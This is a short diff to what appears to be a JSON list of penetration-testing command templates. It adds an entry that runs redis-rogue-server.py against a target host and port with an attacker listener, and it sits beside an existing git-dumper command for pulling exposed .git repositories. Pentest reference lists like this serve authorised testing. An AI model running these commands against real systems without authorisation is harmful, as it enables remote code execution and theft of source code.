@@ -166,6 +166,12 @@
     },
     {
       "os": "Linux",
+      "cmd": "python3 redis-rogue-server.py --rhost {RHOST} --rport 6379 --lhost
+{LHOST} --lport 6379",
+      "description": "redis rougue server"
+    },
+    {
+      "os": "Linux",
       "cmd": "git-dumper {GIT_REPO_URL} {OUTPUT_DIRECTORY}",
       "description": "Download and extract a hidden .git repository from a web server into a specified local directory."
     }
